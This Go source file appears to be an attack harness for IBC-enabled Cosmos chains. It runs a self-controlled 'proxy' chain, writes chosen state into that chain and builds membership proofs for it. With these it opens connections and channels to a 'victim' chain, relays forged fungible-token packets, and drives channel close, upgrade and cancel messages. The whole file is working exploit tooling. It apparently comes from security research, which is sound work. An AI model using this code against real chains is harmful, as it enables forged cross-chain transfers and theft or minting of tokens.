package chain

import (
	"context"
	cosmossdk_io_math "cosmossdk.io/math"
	"encoding/json"
	"fmt"
	"github.com/cometbft/cometbft/light"
	"github.com/cosmos/cosmos-sdk/codec"
	"github.com/cosmos/cosmos-sdk/crypto/hd"
	github_com_cosmos_cosmos_sdk_types "github.com/cosmos/cosmos-sdk/types"
	feetypes "github.com/cosmos/ibc-go/v8/modules/apps/29-fee/types"
	clienttypes "github.com/cosmos/ibc-go/v8/modules/core/02-client/types"
	connectiontypes "github.com/cosmos/ibc-go/v8/modules/core/03-connection/types"
	chantypes "github.com/cosmos/ibc-go/v8/modules/core/04-channel/types"
	commitmenttypes "github.com/cosmos/ibc-go/v8/modules/core/23-commitment/types"
	host "github.com/cosmos/ibc-go/v8/modules/core/24-host"
	ibcexported "github.com/cosmos/ibc-go/v8/modules/core/exported"
	tmclient "github.com/cosmos/ibc-go/v8/modules/light-clients/07-tendermint"
	"github.com/cosmos/relayer/v2/cmd"
	"github.com/cosmos/relayer/v2/relayer"
	"github.com/cosmos/relayer/v2/relayer/chains/cosmos"
	"github.com/cosmos/relayer/v2/relayer/provider"
	"go.uber.org/zap"
	"main/types"
	"main/utils"
	"os"
	"path/filepath"
	"time"
)

const defaultVersion = "ics20-2"
const prefix = "ibc"

type ChainWrapper struct {
	// a legit chain
	chainClient *relayer.Chain
	codec       *codec.ProtoCodec
	localChain  *LocalChain
	context     context.Context
	address     string
	revision    int
}

type ChainInitParams struct {
	ChainId         string
	CpChainId       string
	Prefix          string
	Mnemonic        string
	Key             string
	HomePath        string
	NumOfValidators int
}

type PathEnd struct {
	ClientId string
	ConnId   string
	Port     string
	ChanId   string
	Seq      uint64
}

func (pe *PathEnd) Clone() *PathEnd {
	return &PathEnd{
		ClientId: pe.ClientId,
		ConnId:   pe.ConnId,
		Port:     pe.Port,
		ChanId:   pe.ChanId,
		Seq:      pe.Seq,
	}
}

type Path struct {
	Source *PathEnd
	Dest   *PathEnd
}

func (path *Path) Reverse() *Path {
	return &Path{
		Source: path.Dest,
		Dest:   path.Source,
	}
}

func (path *Path) Clone() *Path {
	return &Path{
		Source: path.Source.Clone(),
		Dest:   path.Dest.Clone(),
	}
}

func NewPath(sourcePort, destPort string) *Path {
	return &Path{
		Source: &PathEnd{Port: sourcePort},
		Dest:   &PathEnd{Port: destPort},
	}
}
func addChainFromFile(chainId, file, homePath string) (*relayer.Chain, error) {
	var pcw cmd.ProviderConfigWrapper
	if _, err := os.Stat(file); err != nil {
		utils.HandleError(err)
	}

	byt, err := os.ReadFile(file)
	utils.HandleError(err)

	if err = json.Unmarshal(byt, &pcw); err != nil {
		return nil, err
	}

	logs := zap.NewExample()
	prov, err := pcw.Value.NewProvider(
		logs,
		homePath, true, chainId,
	)
	utils.HandleError(err)
	c := relayer.NewChain(logs, prov, true)

	return c, nil
}

func NewChainWrapper(params ChainInitParams, codec *codec.ProtoCodec, ctx context.Context) *ChainWrapper {
	c, err := addChainFromFile(params.ChainId, filepath.Join(params.HomePath, "chains", fmt.Sprintf("%s.json", params.ChainId)), params.HomePath)
	utils.HandleError(err)
	err = c.ChainProvider.Init(ctx)
	utils.HandleError(err)
	if params.Mnemonic != "" {

		_, err = c.ChainProvider.RestoreKey(params.Key, params.Mnemonic, 118, string(hd.Secp256k1Type))
		utils.HandleError(err)

	} else {
		err = c.ChainProvider.UseKey(params.Key)
		utils.HandleError(err)
	}
	addr, err := c.ChainProvider.Address()
	utils.HandleError(err)
	localChain := NewLocalChain([]byte(params.Prefix), params.NumOfValidators, params.CpChainId, int64(clienttypes.ParseChainID(params.CpChainId)))
	return &ChainWrapper{chainClient: c,
		codec:      codec,
		localChain: localChain,
		context:    ctx,
		address:    addr,
		revision:   int(clienttypes.ParseChainID(params.ChainId)),
	}
}

func (cw *ChainWrapper) Provider() *cosmos.CosmosProvider {
	return cw.chainClient.ChainProvider.(*cosmos.CosmosProvider)
}

func (cw *ChainWrapper) Context() context.Context {
	return cw.context
}

func (cw *ChainWrapper) Address() string {
	return cw.address
}

func (cw *ChainWrapper) getClientAndConsensusState() (ibcexported.ClientState, ibcexported.ConsensusState) {

	cs := cw.localChain.GetClientState()
	csUnPacked, err := clienttypes.PackClientState(cs)
	utils.HandleError(err)
	unpackedCs, err := clienttypes.UnpackClientState(csUnPacked)

	cos := cw.localChain.GetConsensusState()
	cosUnPacked, err := clienttypes.PackConsensusState(cos)
	utils.HandleError(err)
	unpackedCos, err := clienttypes.UnpackConsensusState(cosUnPacked)

	return unpackedCs, unpackedCos
}

func (cw *ChainWrapper) msgCreateClient(
	clientState ibcexported.ClientState,
	consensusState ibcexported.ConsensusState) (provider.RelayerMessage, error) {

	anyClientState, err := clienttypes.PackClientState(clientState)
	if err != nil {
		return nil, err
	}

	anyConsensusState, err := clienttypes.PackConsensusState(consensusState)
	if err != nil {
		return nil, err
	}

	msg := &clienttypes.MsgCreateClient{
		ClientState:    anyClientState,
		ConsensusState: anyConsensusState,
		Signer:         cw.Address(),
	}

	return cosmos.NewCosmosMessage(msg, func(signer string) {
		msg.Signer = signer
	}), nil
}
func (cw *ChainWrapper) CeateClient() string {
	cls, cs := cw.getClientAndConsensusState()
	msg, _ := cw.msgCreateClient(cls, cs)

	resp, _, err := cw.Provider().SendMessage(cw.Context(), msg, "create client")
	utils.HandleError(err)
	return utils.ParseClientIDFromEvents(resp.Events)
}

func (cw *ChainWrapper) updateClient(clientId string) {
	state := cw.localChain.Advance()
	msg, _ := cw.chainClient.ChainProvider.MsgUpdateClient(clientId, state)
	resp, _, err := cw.chainClient.ChainProvider.SendMessage(cw.context, msg, "update client")
	fmt.Println(resp)
	utils.HandleError(err)
}

func (cw *ChainWrapper) InitProxyToVictimConnection(pathParams *Path) string {

	msg := cosmos.NewCosmosMessage(&connectiontypes.MsgConnectionOpenInit{
		ClientId: pathParams.Source.ClientId,
		Counterparty: connectiontypes.Counterparty{
			ClientId:     pathParams.Dest.ClientId,
			ConnectionId: "",
			Prefix:       commitmenttypes.NewMerklePrefix([]byte(prefix)),
		},
		Version: nil,
		Signer:  cw.Address(),
	}, nil)
	resp, _, err := cw.Provider().SendMessage(cw.context, msg, "init connection")
	utils.HandleError(err)

	return utils.ParseConnectionIDFromEvents(resp.Events)
}

func (cw *ChainWrapper) AckProxyToVictimConnection(pathParams *Path) {

	merklePrefix := commitmenttypes.NewMerklePrefix([]byte(prefix))
	expectedCounterparty := connectiontypes.NewCounterparty(pathParams.Source.ClientId, pathParams.Source.ConnId, merklePrefix)
	expectedConnection := connectiontypes.NewConnectionEnd(connectiontypes.TRYOPEN, pathParams.Dest.ClientId, expectedCounterparty, connectiontypes.GetCompatibleVersions(), 0)
	marshaledExpectedConnection, err := cw.codec.Marshal(&expectedConnection)
	utils.HandleError(err)
	tryProofKey := host.ConnectionKey(pathParams.Dest.ConnId)
	cw.localChain.Set(tryProofKey, marshaledExpectedConnection)

	cw.updateClient(pathParams.Source.ClientId)

	tryProofProofUnmarshalled := cw.localChain.GetMembershipProof(tryProofKey)
	tryProof, err := cw.codec.Marshal(&tryProofProofUnmarshalled)

	msg := cosmos.NewCosmosMessage(&connectiontypes.MsgConnectionOpenAck{
		ConnectionId:             pathParams.Source.ConnId,
		CounterpartyConnectionId: pathParams.Dest.ConnId,
		Version:                  connectiontypes.DefaultIBCVersion,
		ProofHeight: clienttypes.Height{
			RevisionNumber: cw.localChain.Height().RevisionNumber,
			RevisionHeight: cw.localChain.Height().RevisionHeight,
		},
		ProofTry: tryProof,
		Signer:   cw.address,
	}, nil)

	_, _, err = cw.Provider().SendMessage(cw.context, msg, "ack connection")
	utils.HandleError(err)

}

func (cw *ChainWrapper) InitProxyToVictimChannel(pathParams *Path, version string) string {

	msg := cosmos.NewCosmosMessage(&chantypes.MsgChannelOpenInit{
		PortId: pathParams.Source.Port,
		Channel: chantypes.Channel{
			State:    chantypes.INIT,
			Ordering: chantypes.UNORDERED,
			Counterparty: chantypes.Counterparty{
				PortId:    pathParams.Dest.Port,
				ChannelId: "",
			},
			ConnectionHops: []string{pathParams.Source.ConnId},
			Version:        version,
		},
		Signer: cw.Address(),
	}, nil)
	resp, _, err := cw.chainClient.ChainProvider.SendMessage(cw.context, msg, "init channel")
	utils.HandleError(err)

	return utils.ParseChannelIDFromEvents(resp.Events)
}

func (cw *ChainWrapper) AckProxyToVictimChannel(pathParams *Path, version string) {

	expectedCounterparty := chantypes.NewCounterparty(pathParams.Source.Port, pathParams.Source.ChanId)

	expectedChannel := chantypes.NewChannel(
		chantypes.TRYOPEN, chantypes.UNORDERED, expectedCounterparty,
		[]string{pathParams.Dest.ConnId}, version,
	)
	marshaledExpectedChan, err := cw.codec.Marshal(&expectedChannel)
	utils.HandleError(err)

	chanKey := host.ChannelKey(pathParams.Dest.Port, pathParams.Dest.ChanId)
	cw.localChain.Set(chanKey, marshaledExpectedChan)
	tryProofProofUnmarshalled := cw.localChain.GetMembershipProof(chanKey)
	tryProof, err := cw.codec.Marshal(&tryProofProofUnmarshalled)

	cw.updateClient(pathParams.Source.ClientId)
	msg := cosmos.NewCosmosMessage(&chantypes.MsgChannelOpenAck{
		PortId:                pathParams.Source.Port,
		ChannelId:             pathParams.Source.ChanId,
		CounterpartyChannelId: pathParams.Dest.ChanId,
		CounterpartyVersion:   version,
		ProofTry:              tryProof,
		ProofHeight:           cw.localChain.Height(),
		Signer:                cw.Address(),
	}, nil)

	_, _, err = cw.Provider().SendMessage(cw.context, msg, "try channel")
	utils.HandleError(err)

}

func (cw *ChainWrapper) ReceivePacketV2(pathParams *Path, fungTokenData types.FungibleTokenPacketDataV2) *provider.RelayerTxResponse {

	packetDataBytes := fungTokenData.GetBytes()
	toHeight := clienttypes.Height{RevisionNumber: 0, RevisionHeight: 0}
	toTimestamp := uint64(time.Now().Add(time.Hour).UnixNano())

	packet := chantypes.Packet{
		Data:               packetDataBytes,
		Sequence:           pathParams.Source.Seq,
		SourcePort:         pathParams.Source.Port,
		SourceChannel:      pathParams.Source.ChanId,
		DestinationPort:    pathParams.Dest.Port,
		DestinationChannel: pathParams.Dest.ChanId,
		TimeoutHeight:      toHeight,
		TimeoutTimestamp:   toTimestamp,
	}

	commitment := chantypes.CommitPacket(cw.codec, packet)
	packetCommitmentKey := host.PacketCommitmentKey(pathParams.Source.Port, pathParams.Source.ChanId, pathParams.Source.Seq)
	cw.localChain.Set(packetCommitmentKey, commitment)
	cw.updateClient(pathParams.Source.ClientId)

	commProofProofUnmarshalled := cw.localChain.GetMembershipProof(packetCommitmentKey)
	proof, err := cw.codec.Marshal(&commProofProofUnmarshalled)

	msg := cosmos.NewCosmosMessage(&chantypes.MsgRecvPacket{
		Packet:          packet,
		ProofCommitment: proof,
		ProofHeight:     cw.localChain.Height(),
		Signer:          cw.Address(),
	}, nil)
	resp, _, err := cw.chainClient.ChainProvider.SendMessage(cw.context, msg, "receive packet")
	utils.HandleError(err)
	fmt.Println(resp)
	return resp
}

func (cw *ChainWrapper) GetNumberOfPacketCommitmentsAndLastSeq(chanel, port string) (int, uint64) {
	latestHeight, err := cw.chainClient.ChainProvider.QueryLatestHeight(cw.Context())
	utils.HandleError(err)
	comms, err := cw.chainClient.ChainProvider.QueryPacketCommitments(cw.Context(), uint64(latestHeight), chanel, port)
	utils.HandleError(err)
	total := len(comms.Commitments)
	seq := 0
	if total > 0 {
		last := comms.Commitments[total-1]
		seq = int(last.Sequence)
	}
	return len(comms.Commitments), uint64(seq)
}

func (cw *ChainWrapper) IsPacketAcknowledged(chanel, port string, seq uint64) bool {
	latestHeight, err := cw.chainClient.ChainProvider.QueryLatestHeight(cw.Context())
	utils.HandleError(err)
	ack, err := cw.chainClient.ChainProvider.QueryPacketAcknowledgement(cw.Context(), latestHeight, chanel, port, seq)
	if err != nil {
		fmt.Println(err)
		return false
	}

	return len(ack.Acknowledgement) > 0 && len(ack.Proof) > 0
}

func (cw *ChainWrapper) IsPacketReceived(chanel, port string, seq uint64) bool {
	latestHeight, err := cw.chainClient.ChainProvider.QueryLatestHeight(cw.Context())
	utils.HandleError(err)
	rec, err := cw.chainClient.ChainProvider.QueryPacketReceipt(cw.Context(), latestHeight, chanel, port, seq)
	utils.HandleError(err)

	return rec.Received && rec.Proof != nil && len(rec.Proof) > 0
}

func (cw *ChainWrapper) GetClientState() ibcexported.ClientState {
	latestHeight, err := cw.chainClient.ChainProvider.QueryLatestHeight(cw.Context())
	utils.HandleError(err)

	tmCs := &tmclient.ClientState{
		ChainId:    cw.chainClient.ChainID(),
		TrustLevel: tmclient.NewFractionFromTm(light.DefaultTrustLevel),
		LatestHeight: clienttypes.Height{
			RevisionNumber: uint64(cw.revision),
			RevisionHeight: uint64(latestHeight),
		},
		ProofSpecs:      commitmenttypes.GetSDKSpecs(),
		UpgradePath:     []string{"upgrade", "upgradedIBCState"},
		TrustingPeriod:  time.Hour * 24,
		UnbondingPeriod: time.Hour * 504,
		MaxClockDrift:   1,
	}
	return tmCs
}

func (cw *ChainWrapper) AckProxyToVictimConnectionOld(pathParams *Path) {
	correctClientState := cw.GetClientState()
	cpCsKey := []byte(host.FullClientStatePath(pathParams.Dest.ClientId))
	packed, err := clienttypes.PackClientState(correctClientState)
	utils.HandleError(err)

	cpCsMarshalled, err := cw.codec.Marshal(packed)
	utils.HandleError(err)

	cw.localChain.Set(cpCsKey, cpCsMarshalled)
	utils.HandleError(err)
	ccs := correctClientState.(*tmclient.ClientState)
	counterpartyConsensusState, _, err := cw.chainClient.ChainProvider.QueryConsensusState(cw.context, int64(ccs.LatestHeight.GetRevisionHeight()))
	cpCosKey := []byte(host.FullConsensusStatePath(pathParams.Dest.ClientId, ccs.LatestHeight))
	utils.HandleError(err)
	packedConsensus, err := clienttypes.PackConsensusState(counterpartyConsensusState)
	cpCosMarshalled, err := cw.codec.Marshal(packedConsensus)
	utils.HandleError(err)
	cw.localChain.Set(cpCosKey, cpCosMarshalled)

	expectedCounterparty := connectiontypes.NewCounterparty(pathParams.Source.ClientId, pathParams.Source.ConnId, commitmenttypes.NewMerklePrefix([]byte(prefix)))
	expectedConnection := connectiontypes.NewConnectionEnd(connectiontypes.TRYOPEN, pathParams.Dest.ClientId, expectedCounterparty, connectiontypes.GetCompatibleVersions(), 0)
	marshaledExpectedConnection, err := cw.codec.Marshal(&expectedConnection)
	utils.HandleError(err)
	tryProofKey := []byte(host.ConnectionPath(pathParams.Dest.ConnId))
	cw.localChain.Set(tryProofKey, marshaledExpectedConnection)

	msg, _ := cw.chainClient.ChainProvider.MsgUpdateClient(pathParams.Source.ClientId, cw.localChain.Advance())
	_, _, err = cw.chainClient.ChainProvider.SendMessage(cw.context, msg, "update client")
	utils.HandleError(err)

	clientStateProofUnmarshalled := cw.localChain.GetMembershipProof(cpCsKey)
	clientStateProof, err := cw.codec.Marshal(&clientStateProofUnmarshalled)

	utils.HandleError(err)
	consStateProofUnmarshalled := cw.localChain.GetMembershipProof(cpCosKey)
	consStateProof, err := cw.codec.Marshal(&consStateProofUnmarshalled)

	tryProofProofUnmarshalled := cw.localChain.GetMembershipProof(tryProofKey)
	tryProof, err := cw.codec.Marshal(&tryProofProofUnmarshalled)

	msg, _ = cw.chainClient.ChainProvider.MsgConnectionOpenAck(provider.ConnectionInfo{ConnID: pathParams.Dest.ConnId,
		CounterpartyConnID:           pathParams.Source.ConnId,
		CounterpartyCommitmentPrefix: commitmenttypes.NewMerklePrefix([]byte(prefix))},
		provider.ConnectionProof{ConsensusStateProof: consStateProof,
			ClientStateProof:     clientStateProof,
			ConnectionStateProof: tryProof,
			ProofHeight:          cw.localChain.Height(),
			ClientState:          correctClientState})
	_, _, err = cw.chainClient.ChainProvider.SendMessage(cw.context, msg, "ack connection")
	utils.HandleError(err)

}

func (cw *ChainWrapper) OpenSpecificChannel(pathParams *Path, ver string, desiredChan string) string {
	for {
		theChan := cw.InitProxyToVictimChannel(pathParams, ver)

		if theChan == desiredChan {
			return theChan
		}
	}
}

func (cw *ChainWrapper) PayFees(pathParams *Path, amount int) {
	fee := github_com_cosmos_cosmos_sdk_types.Coins{
		github_com_cosmos_cosmos_sdk_types.Coin{
			Denom:  "samoleans",
			Amount: cosmossdk_io_math.NewInt(int64(amount)),
		},
	}
	payPackFeeMsg := feetypes.MsgPayPacketFee{Fee: feetypes.Fee{
		RecvFee:    fee,
		AckFee:     fee,
		TimeoutFee: fee,
	},
		SourcePortId:    pathParams.Source.Port,
		SourceChannelId: pathParams.Source.ChanId,
		Signer:          cw.Address(),
	}
	message, _, err := cw.chainClient.ChainProvider.SendMessage(cw.Context(), cosmos.NewCosmosMessage(&payPackFeeMsg, nil), "")
	utils.HandleError(err)
	fmt.Println(message)
}

func (cw *ChainWrapper) QueryFeesForSeq(pathParams *Path, seq int) (*feetypes.QueryTotalAckFeesResponse, int) {
	cc := feetypes.NewQueryClient(cw.chainClient.ChainProvider.(*cosmos.CosmosProvider))
	if seq > 0 {
		fees, err := cc.TotalAckFees(cw.Context(), &feetypes.QueryTotalAckFeesRequest{
			PacketId: chantypes.PacketId{PortId: pathParams.Source.Port, ChannelId: pathParams.Source.ChanId, Sequence: uint64(seq)},
		})
		fmt.Println(err)
		return fees, seq

	}
	for i := 0; ; i++ {
		fees, err := cc.TotalAckFees(cw.Context(), &feetypes.QueryTotalAckFeesRequest{
			PacketId: chantypes.PacketId{PortId: pathParams.Source.Port, ChannelId: pathParams.Source.ChanId, Sequence: uint64(i)},
		})
		if err != nil {
			continue
		}
		return fees, i

	}
}

func (cw *ChainWrapper) CloseChanConfirm(pathParams *Path, ver string) {
	expectedCounterparty := chantypes.NewCounterparty(pathParams.Source.Port, pathParams.Source.ChanId)

	expectedChannel := chantypes.NewChannel(
		chantypes.CLOSED, chantypes.UNORDERED, expectedCounterparty,
		[]string{pathParams.Dest.ConnId}, ver,
	)
	marshaledExpectedChan, err := cw.codec.Marshal(&expectedChannel)
	utils.HandleError(err)

	chanKey := host.ChannelKey(pathParams.Dest.Port, pathParams.Dest.ChanId)
	cw.localChain.Set(chanKey, marshaledExpectedChan)

	cw.updateClient(pathParams.Source.ClientId)
	closeProofUnmarshlled := cw.localChain.GetMembershipProof(chanKey)
	closeProof, err := cw.codec.Marshal(&closeProofUnmarshlled)
	msg := cosmos.NewCosmosMessage(&chantypes.MsgChannelCloseConfirm{
		PortId:      pathParams.Source.Port,
		ChannelId:   pathParams.Source.ChanId,
		ProofInit:   closeProof,
		ProofHeight: cw.localChain.Height(),
		Signer:      cw.Address(),
	}, nil)

	_, _, err = cw.Provider().SendMessage(cw.context, msg, "close channel")
	utils.HandleError(err)

}

func (cw *ChainWrapper) TryUpgrade(pathParams *Path, ver string, newConn string) {
	expectedCounterparty := chantypes.NewCounterparty(pathParams.Source.Port, pathParams.Source.ChanId)

	expectedChannel := chantypes.NewChannel(
		chantypes.OPEN, chantypes.UNORDERED, expectedCounterparty,
		[]string{pathParams.Dest.ConnId}, ver,
	)
	expectedChannel.UpgradeSequence = 1
	marshaledExpectedChan, err := cw.codec.Marshal(&expectedChannel)
	utils.HandleError(err)

	chanKey := host.ChannelKey(pathParams.Dest.Port, pathParams.Dest.ChanId)
	cw.localChain.Set(chanKey, marshaledExpectedChan)
	flds := chantypes.UpgradeFields{
		Ordering:       chantypes.UNORDERED,
		ConnectionHops: []string{pathParams.Dest.ConnId},
		Version:        ver,
	}
	up := chantypes.NewUpgrade(flds, chantypes.Timeout{}, 0)
	marshalledUp, err := cw.codec.Marshal(&up)
	upKey := host.ChannelUpgradeKey(pathParams.Dest.Port, pathParams.Dest.ChanId)
	cw.localChain.Set(upKey, marshalledUp)

	cw.updateClient(pathParams.Source.ClientId)
	chanProofUnmarshalled := cw.localChain.GetMembershipProof(chanKey)
	chanProof, err := cw.codec.Marshal(&chanProofUnmarshalled)
	upProofUnmarshalled := cw.localChain.GetMembershipProof(upKey)
	upProof, err := cw.codec.Marshal(&upProofUnmarshalled)
	msg := cosmos.NewCosmosMessage(&chantypes.MsgChannelUpgradeTry{ChannelId: pathParams.Source.ChanId, PortId: pathParams.Source.Port, ProposedUpgradeConnectionHops: []string{newConn},
		CounterpartyUpgradeFields: flds, CounterpartyUpgradeSequence: 1, ProofChannel: chanProof, ProofUpgrade: upProof, ProofHeight: cw.localChain.Height(), Signer: cw.Address()}, nil)

	_, _, err = cw.Provider().SendMessage(cw.context, msg, "close channel")
	utils.HandleError(err)

}

func (cw *ChainWrapper) CancelUpgrade(pathParams *Path) {

	errRec := chantypes.ErrorReceipt{Sequence: 1, Message: "hello"}
	marshalledUp, err := cw.codec.Marshal(&errRec)
	errKey := host.ChannelUpgradeErrorKey(pathParams.Dest.Port, pathParams.Dest.ChanId)
	cw.localChain.Set(errKey, marshalledUp)

	cw.updateClient(pathParams.Source.ClientId)
	errProofUnmarshalled := cw.localChain.GetMembershipProof(errKey)
	errProof, err := cw.codec.Marshal(&errProofUnmarshalled)

	msg := cosmos.NewCosmosMessage(&chantypes.MsgChannelUpgradeCancel{ChannelId: pathParams.Source.ChanId, PortId: pathParams.Source.Port, ErrorReceipt: errRec, ProofErrorReceipt: errProof, ProofHeight: cw.localChain.Height(), Signer: cw.Address()}, nil)

	_, _, err = cw.Provider().SendMessage(cw.context, msg, "close channel")
	utils.HandleError(err)

}

func (cw *ChainWrapper) CloseChanInit(pathParams *Path) {

	msg, err := cw.chainClient.ChainProvider.MsgChannelCloseInit(provider.ChannelInfo{PortID: pathParams.Source.Port,
		ChannelID: pathParams.Source.ChanId,
	},
		provider.ChannelProof{})
	utils.HandleError(err)

	_, _, err = cw.Provider().SendMessage(cw.context, msg, "close channel")
	utils.HandleError(err)

}
func GetVersionForFees() (error, string) {
	verWithfee := feetypes.Metadata{
		FeeVersion: feetypes.Version,
		AppVersion: defaultVersion,
	}
	versionBytes, err := feetypes.ModuleCdc.MarshalJSON(&verWithfee)
	utils.HandleError(err)
	verStr := string(versionBytes)
	return err, verStr
}
